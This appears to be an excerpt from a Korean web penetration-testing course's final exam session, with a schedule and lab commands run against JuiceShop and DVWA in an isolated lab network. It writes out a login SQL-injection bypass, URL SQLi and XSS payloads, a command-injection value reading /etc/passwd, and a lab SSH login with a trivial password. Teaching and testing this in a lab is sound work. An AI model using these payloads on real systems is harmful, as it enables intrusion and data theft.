...
기말도 시험이지만, 본 강의 시간은 시험 직전의 **14주 통합 복습 + 점검 사이클 판단 프레임워크
정립 + 실기 평가**로 구성한다.

| 시간        | 내용                                                                       | 유형      |
|-------------|----------------------------------------------------------------------------|-----------|
| 0:00–0:20   | 이론 — 전문 점검자란 무엇인가, 왜 한 사이클을 방법론(WSTG)으로 도는가       | 강의      |
| 0:20–0:55   | 이론 — 점검 한 사이클: 정찰→인증→주입→접근제어→위험 평가→보고 + 14주 매핑   | 강의      |
| 0:55–1:05   | 휴식                                                                        | —         |
| 1:05–1:35   | 이론 — 표적(JuiceShop/DVWA) 구조 + 진입 경로(Host 헤더 vhost·출처 IP 보존)  | 강의/토론 |
| 1:35–2:00   | 실기 — 점검(도달성) + ① 정찰(nuclei 기술/헤더) (lab 1–2)                    | 시험      |
| 2:00–2:30   | 실기 — ② 인증 우회(로그인 SQLi) + JWT payload 분석 (lab 3–4)                | 시험      |
| 2:30–2:40   | 휴식                                                                        | —         |
| 2:40–3:10   | 실기 — ③ 주입(SQLi/XSS/RCE, WAF 차단) + ④ 접근제어(무인증/강제 브라우징) (lab 5–7) | 시험 |
| 3:10–3:30   | 실기 — ⑤ 위험 평가(CVSS) + 권고 + 전문 침투 보고서 (lab 8–10)               | 시험      |
| 3:30–3:40   | 정리 + 채점 기준 안내 + 수료 + 점검자로서의 다음 단계                       | 정리      |
...
> 보존하므로(§3.2) 이 두 얼굴이 같은 출처 IP `10.20.30.202` 로 한 사건에 묶인다.
>
...
것이다. el34 의 점검자 컨테이너(`el34-attacker`, 출처 IP `10.20.30.202`)가 fw 의 게이트웨이
(`10.20.30.1`)를 통해, HTTP `Host` 헤더로 표적 vhost(`juice.el34.lab` 또는 `dvwa.el34.lab`)를 지정해
점검한다.
...
> 템플릿을 표적에 던진다. el34 의 attacker 에는 템플릿 모음이 `/root/nuclei-templates/` 아래에 설치돼
...
```mermaid
graph TD
    ATK["점검자 el34-attacker<br/>10.20.30.202<br/>curl/nuclei -H 'Host: ...'"]
...
점검 요청은 점검자(`10.20.30.202`)에서 출발해 fw 의 게이트웨이(`10.20.30.1`)로 들어가고, fw 가 DNAT
로 web(`10.20.32.80`)에 전달한다. el34 의 fw 는 **SNAT 를 하지 않으므로**, web 의 Apache access.log 와
ModSecurity audit 에 점검자의 **진짜 출처 IP `10.20.30.202`** 가 그대로 남는다. 그래서 한 점검 사이클의
...
호스트(`ssh ccc@192.168.0.151`, 비밀번호 1)에서 `docker exec el34-attacker`(점검) 로 실행한다. 점검의
...
```bash
docker exec el34-attacker sh -c "nuclei -u http://10.20.30.1 -H 'Host: juice.el34.lab' -t /root/nuclei-templates/http/technologies/tech-detect.yaml -t /root/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc 2>/dev/null | head -8"
```
...
```bash
docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv15.json http://10.20.30.1/rest/user/login | head -c 100; rm -f /tmp/wv15.json'
```
...
```bash
docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'sqli=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20OR%20%271%27=%271\"; curl -s -o /dev/null -w 'xss=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C/script%3E\""
docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'rce=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
```
...
```bash
docker exec el34-attacker sh -c "curl -sk -o /dev/null -w 'admincfg=%{http_code} ' -H 'Host: juice.el34.lab' http://10.20.30.1/rest/admin/application-configuration; curl -sk -o /dev/null -w 'ftp=%{http_code}\n' -H 'Host: juice.el34.lab' http://10.20.30.1/ftp"
```
...
> **시험 진행 원칙.** 모든 명령은 el34 호스트(`ssh ccc@192.168.0.151`)에서 `docker exec el34-attacker`
...
> 지도가 그려진 것. 비정상: 0 건이면 템플릿 경로(`/root/nuclei-templates/...`)·Host 헤더를 재확인.
>
